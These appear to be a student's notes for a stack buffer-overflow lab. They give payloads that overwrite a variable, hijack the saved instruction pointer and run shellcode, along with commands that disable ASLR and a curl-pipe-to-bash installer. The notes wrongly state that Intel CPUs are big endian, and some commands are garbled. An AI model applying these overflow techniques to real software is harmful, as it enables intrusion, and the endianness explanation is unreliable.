# 4-6 Memory corruption

**Preconditions**
1. download and unzip sources for this exercise
2. TO BE EXECUTED AFTER EVERY REEBOOT: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
    - will disable ASLR
3. `bash -c "$(curl -fsSL https://gef.blah.cat/sh)"`
    - installs GEF
        - a tool to help reverse-enginners code developed with GDB
        - https://github.com/hugsy/gef  GEF (GDB enhanced features)
        - https://www.sourceware.org/gdb/ Gnu project debugger
4. `make` > to compile program defined in make file


How to execute: `./mmchallenge password`   (will execute mmchallenge in current dir)


*Remark: if gef is correctly installed we the prompts name is "gef" and not "gdb" (close and reopen terminal?)*

### Exercise 4 Variable overflow

Execute: `./mmchallenge \``python -c 'print("A"*132)'``           *(markdown encoding probably not ok)*          


Info: char array has 128 bytes. here we overwrite it by 4 bytes (as int isAdmin has 4 bytes)

### Exercise 5 SIP overflow with function

Execute: `./mmchallenge \``python -c 'print("A"*142+"\x2c\x13\x40")'``           *(markdown encoding probably not ok)*          
       
Similar to exercise 4 but we overwrite 18 bytes: 
- 128 char array
- 4 for int variable admin
- 12  for SFP and IP

finding address of flag2 (see exercise): 
-  `gdb -q ./mmchallenge`  -> start debugger
- gef> "run `python -c 'print("A"*144)'`"   (markup incorrectly formated)

 0x40132c -> change it to Big Endian 


Execute with address to flag2 (big endian): `./mmchallenge \``python -c 'print("A"*144)'``    

### Exercise 6 SIP overflow with shellcode

- `python ./mmexploit.py 128 0xAAAABBBBCCCCDDDD | hexdump -C`  runs python script (attention, in exercise statement is missing "python")


- `gdb -q ./mmchallenge`  
- gef> run `python -c 'print("A"*142+"BBBB")'`
    - `x/32x $rsp` -> show memory (browse through it with ENTER)
        - find address with AAAA (0x41414141) pass it as argument
    - gef> run "`python ./mmexploit.py 142 0x7fffffffe270`"   (address mustmarkup incorrec, in exercise "r" instead of run)




### Stack layout (info .. also see powerpoint)
Area in memory that is allocated to a program to story temporary variabls and function call info. 


Stack layout  (starting at 0xFFF mem address) 
|        (func parameters)
|        SIP: stored instruction pointer
|        SFP
|   [ variable xx ]
|   [ ss-array 1 ]
|   [ ss-array 0 ]
|        10x (mem address)
- Stack grows down (meaning if we add a variable in code, it will grow down to a lower address) 
- writes go up: so array[2] will actually write into variable xx

### Convert hex to big endian
Big endian is used internally (for historical reasons) by the intel CPU (and maybe others). Therefore, when writing raw data into memory (especially if the data is to be consumed/executed directly by the CPU, in big endian format. 

Basiclly just revert order of bytes!
Example: 0x40132c  -> 0x2c  0x13  0x40



### Varia

ASLR: Address space layout randomization  (My understanding: will randomize address space in order to make memory corruption unpredictable)
